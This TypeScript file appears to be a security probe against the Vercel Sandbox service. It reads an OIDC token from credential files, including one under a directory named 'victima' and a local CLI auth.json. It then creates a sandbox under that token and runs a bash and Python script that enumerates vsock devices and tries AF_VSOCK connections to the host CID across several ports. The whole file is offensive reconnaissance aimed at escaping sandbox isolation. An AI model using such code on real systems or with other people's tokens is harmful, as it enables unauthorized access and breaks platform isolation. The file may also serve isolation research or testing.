import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "vsock-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "=== vsock device ==="
ls -la /dev/vsock 2>&1
echo "=== /proc/net/vsock (listeners) ==="
cat /proc/net/vsock 2>&1 | head -15
echo "=== kernel vsock modules ==="
grep -i vsock /proc/modules 2>/dev/null
ls /sys/module/vsock* 2>/dev/null
echo "=== try AF_VSOCK connect to common cid/ports (python) ==="
timeout 12 python3 -c "
import socket, struct
# AF_VSOCK = 40, VMADDR_CID_ANY=0xffffffff, HOST=2, LOCAL=1
try:
    for cid in [2, 0xffffffff]:
        for port in [0, 1, 2, 53, 1024, 3000, 8080, 23456]:
            s = socket.socket(40, socket.SOCK_STREAM)
            s.settimeout(0.6)
            try:
                s.connect((cid, port))
                print('CONNECT OK cid=%s port=%s' % (cid, port))
                try:
                    s.sendall(b'hello')
                    d = s.recv(200)
                    print('  recv:', repr(d[:120]))
                except Exception as e:
                    print('  after connect:', type(e).__name__)
            except Exception as e:
                pass
            s.close()
    print('vsock scan done')
except Exception as e:
    print('vsock ERR:', e)
"
echo "=== DONE ==="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });